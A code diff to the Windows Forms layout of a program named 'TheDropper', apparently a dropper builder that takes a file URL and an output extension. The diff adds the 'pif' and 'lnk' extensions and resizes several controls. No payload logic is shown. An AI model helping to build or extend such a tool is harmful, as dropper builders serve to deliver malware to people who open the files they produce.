@@ -65,7 +65,9 @@ namespace TheDropper
             this.comboBoxExtension.Items.AddRange(new object[] {
             "exe",
             "scr",
+            "pif",
             "com",
+            "lnk",
             "bat",
             "cmd",
             "vbs",
@@ -86,7 +88,7 @@ namespace TheDropper
             this.buttonBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(245)))), ((int)(((byte)(150)))), ((int)(((byte)(244)))));
             this.buttonBuild.Location = new System.Drawing.Point(12, 157);
             this.buttonBuild.Name = "buttonBuild";
-            this.buttonBuild.Size = new System.Drawing.Size(222, 43);
+            this.buttonBuild.Size = new System.Drawing.Size(222, 53);
             this.buttonBuild.TabIndex = 3;
             this.buttonBuild.Text = "Build";
             this.buttonBuild.UseVisualStyleBackColor = false;
@@ -100,9 +102,9 @@ namespace TheDropper
             this.labelAuthor.Cursor = System.Windows.Forms.Cursors.Hand;
             this.labelAuthor.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.labelAuthor.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(245)))), ((int)(((byte)(150)))), ((int)(((byte)(244)))));
-            this.labelAuthor.Location = new System.Drawing.Point(66, 211);
+            this.labelAuthor.Location = new System.Drawing.Point(66, 214);
             this.labelAuthor.Name = "labelAuthor";
-            this.labelAuthor.Size = new System.Drawing.Size(112, 13);
+            this.labelAuthor.Size = new System.Drawing.Size(112, 23);
             this.labelAuthor.TabIndex = 4;
             this.labelAuthor.Text = "github.com/L1ghtM4n";
             this.labelAuthor.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
@@ -132,7 +134,7 @@ namespace TheDropper
             // 
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Inherit;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(54)))), ((int)(((byte)(50)))));
-            this.ClientSize = new System.Drawing.Size(246, 232);
+            this.ClientSize = new System.Drawing.Size(246, 242);
             this.Controls.Add(this.labelFileExtension);
             this.Controls.Add(this.labelFileUrl);
             this.Controls.Add(this.labelAuthor);
